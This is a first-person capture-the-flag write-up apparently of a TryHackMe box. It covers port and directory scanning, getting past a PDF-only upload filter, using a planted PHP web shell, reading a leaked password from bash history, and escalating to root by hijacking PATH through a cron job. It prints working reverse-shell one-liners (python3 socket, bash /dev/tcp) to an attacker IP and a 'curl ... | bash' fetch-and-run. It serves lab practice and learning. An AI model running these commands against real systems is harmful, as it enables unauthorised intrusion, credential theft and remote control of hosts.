Apache/2.4.41 (Ubuntu) Server at 10.10.171.190 Port 80

nmap
```
└─$ sudo nmap -Pn -sV -sX 10.10.171.190
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 10:04 PDT
Nmap scan report for 10.10.171.190
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.33 seconds
```

gobuster
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,js,txt,html -u http://10.10.171.190/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.171.190/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2022/08/15 10:05:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.js              (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.js         (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.js         (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.171.190/css/]
/cvs                  (Status: 301) [Size: 312] [--> http://10.10.171.190/cvs/]
/dist                 (Status: 301) [Size: 313] [--> http://10.10.171.190/dist/]                                                                              
/images               (Status: 301) [Size: 315] [--> http://10.10.171.190/images/]                                                                            
/index.html           (Status: 200) [Size: 3413]                                                                                                              
/index.html           (Status: 200) [Size: 3413]                                  
/server-status        (Status: 403) [Size: 278]                                   
/upload.php           (Status: 200) [Size: 552]                                   
                                                  
```

/upload.php
```


Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

wfuzz ( I got stuck and had to consult a walkthrough[https://musyokaian.medium.com/hacker-vs-hacker-tryhackme-walkthrough-de45d24bdfce]. I kept attempting to upload my own reverse shell using the 
above upload source code as a guide but nothing happened. I kept enumerating the /cvs directory to no avail. The walkthrough
showed that .pdf.php can bypass the code to upload a reverse shell. The walkthrough showed how to use WFUZZ to find the attacker's uploaded shell.
```
 wfuzz -c -w big.txt -u http://10.10.171.190/cvs/FUZZ.pdf.php

...
000002457:   200        1 L      2 W        18 Ch       "shell"   
```

on /cvs/shell.pdf.php
```
boom!
```

I fiddled around and tried adding url params. I found that "cmd" worked. (cmd is a pretty classic parameter to use)
(<?php echo shell_exec($_GET['cmd']); ?>) <- I'm guessing that the attacker uploaded something like this.

```
http://10.10.171.190/cvs/shell.pdf.php?cmd=ls

...

index.html
shell.pdf.php
```

We have RCE. Now let's get a shell. 

I found that python3 is on the machine so i ran
```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.46.127",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
└─$ nc -nvlp 1111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.171.190.
Ncat: Connection from 10.10.171.190:50476.
$ nope
```

Hmm, I will have to get creative.
```
http://10.10.171.190/cvs/shell.pdf.php?cmd=ls%20../../../../home
lachlan
```

http://10.10.171.190/cvs/shell.pdf.php?cmd=ls%20-la%20../../../../home/lachlan
```
drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 .
drwxr-xr-x 3 root    root    4096 May  5 04:38 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5 04:38 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5 04:39 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5 04:38 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5 04:38 user.txt
```

http://10.10.171.190/cvs/shell.pdf.php?cmd=cat%20../../../../home/lachlan/bin/backup.sh
```
# todo: pita website backup as requested by her majesty
```

http://10.10.171.190/cvs/shell.pdf.php?cmd=cat%20../../../../home/lachlan/.bash_history
```
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

http://10.10.171.190/cvs/shell.pdf.php?cmd=cat%20../../../../etc/cron.d/persistence
```
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

I'm in!
`lachlan:thisistheway123`
```
Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
$ nope
Connection to 10.10.171.190 closed.
```

okay, maybe not...

http://10.10.171.190/cvs/shell.pdf.php?cmd=cat%20../../../../etc/cron.d/e2scrub_all
```
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r

```

I tried running e2scrub_all and it didn't work as I thought it would. I'm going to try another reverse shell.
`bash -i >& /dev/tcp/10.13.46.127/1111 0>&1`


So I think If I can get a reverse shell up, then I could su into lachlan. I went to /tmp and tried to upload a bash shell.
http://10.10.171.190/cvs/shell.pdf.php?cmd=cd%20../../../../tmp%20|%20wget%2010.13.46.127:8080/bshell.sh (python http.server hosted on my machine)
http://10.10.171.190/cvs/shell.pdf.php?cmd=chmod%20+x%20../../../../tmp/bshell.sh


It looks like the shell wasn't going to /tmp but was going to /var/www/html/cvs

```
total 24
drwxr-xr-x 2 www-data www-data 4096 Aug 15 18:26 .
drwxr-xr-x 6 www-data www-data 4096 May  5 04:38 ..
-rw-r--r-- 1 www-data www-data   43 Aug 15 18:21 bshell.sh
-rw-r--r-- 1 www-data www-data   43 Aug 15 18:21 bshell.sh.1
-rw-r--r-- 1 www-data www-data   26 May  5 13:00 index.html
-rw-r--r-- 1 www-data www-data   47 May  5 12:57 shell.pdf.php

```

I used the same method in the walkthrough "curl 10.13.46.127:8080/bshell.sh | bash" which gets the contents from the reverse shell file and pipes it to bash
running it. I got my foothold!
```
└─$ nc -nvlp 1111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.171.190.
Ncat: Connection from 10.10.171.190:50496.
bash: cannot set terminal process group (725): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b2r:/var/www/html/cvs$ ls
ls
bshell.sh
bshell.sh.1
bshell.sh.2
index.html
shell.pdf.php
www-data@b2r:/var/www/html/cvs$
```

in /home/lachlan/bin
```
 echo "bash -c \"bash -i >& /dev/tcp/10.13.46.127/1112 0>&1\"" > pkill
chmod +x pkill
```

ssh in as lachlan to get our pkill script to execute as root sending a root shell to me.
